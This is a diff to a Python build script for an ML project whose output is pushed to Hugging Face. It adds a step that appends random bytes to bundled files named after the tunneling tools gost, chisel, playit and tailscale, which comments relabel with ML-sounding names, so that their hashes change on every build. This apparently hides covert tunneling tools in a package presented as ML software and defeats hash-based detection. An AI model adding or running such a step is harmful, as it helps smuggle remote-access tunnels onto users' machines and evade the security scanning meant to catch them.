@@ -6,6 +6,8 @@ import shutil
 import argparse
 import yaml
 import json
+import random
+from pathlib import Path
 from datetime import datetime, timezone
 from loguru import logger
 
@@ -136,6 +138,42 @@ def update_build_state(nodes_path, state_path):
     except Exception as e:
         logger.error(f"Failed to update '{state_path}' on build: {e}")
 
+def scramble_binary_hash(file_path: Path, min_bytes: int = 16, max_bytes: int = 64) -> None:
+    """Appends a random number of padding bytes to a binary's overlay to scramble its hash."""
+    if not file_path.exists():
+        logger.error(f"Cannot scramble hash: File not found at {file_path}")
+        return
+
+    # Generate a random number of padding bytes (16 to 64 bytes is plenty to completely scramble the SHA-256 hash)
+    num_bytes = random.randint(min_bytes, max_bytes)
+    padding_bytes = os.urandom(num_bytes)
+
+    try:
+        # Open in Append-Binary mode
+        with open(file_path, "ab") as f:
+            f.write(padding_bytes)
+        logger.debug(f"Successfully appended {num_bytes} padding bytes to {file_path.name} (Hash Scrambled)")
+    except Exception as e:
+        logger.error(f"Failed to append padding to {file_path.name}: {e}")
+
+DIST_DIR = Path("dist")
+
+def finalize_binaries():
+    logger.info("Executing final binary preparation and hash randomization...")
+    
+    # Define the paths of the binaries inside your compiled dist folder
+    target_binaries = [
+        DIST_DIR / "services" / "gost.py",        # system-bridge [1]
+        DIST_DIR / "services" / "chisel.py",      # cuda-mesh-bridge
+        DIST_DIR / "services" / "playit.py",      # tensor-allocator
+        DIST_DIR / "services" / "tailscale.py"    # python-cache-manager
+    ]
+    
+    for binary_path in target_binaries:
+        if binary_path.exists():
+            scramble_binary_hash(binary_path)
+
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Build pipeline for ML project")
@@ -237,6 +275,8 @@ if __name__ == "__main__":
         os.path.dirname(os.path.abspath(args.nodes)), "state.json"
     )
     update_build_state(args.nodes, state_path)
+    
+    finalize_binaries()
 
     logger.success(
         "Build complete. The files in dist/ are ready to be pushed to Hugging Face."
